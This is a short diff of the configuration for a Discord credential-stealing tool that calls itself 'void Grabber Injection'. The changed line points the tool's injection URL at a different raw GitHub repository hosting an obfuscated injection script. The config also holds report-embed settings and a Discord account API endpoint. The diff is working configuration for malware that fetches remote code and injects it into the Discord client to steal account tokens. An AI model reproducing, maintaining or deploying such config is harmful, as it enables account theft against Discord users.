@@ -15,7 +15,7 @@ const config = {
   embed_name: 'void Grabber Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1344829585673556089/1344885957404524564/void.gif?ex=67c28a27&is=67c138a7&hm=592795e8869bda389cc77cb368a008f42c744d72085ba402ff40733ecf4978f2&',
   embed_color: 24625166, 
-  injection_url: 'https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/u8i9vnyhngvjyfvyjf6uy/WANTED_ZEN/refs/heads/main/injection-obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
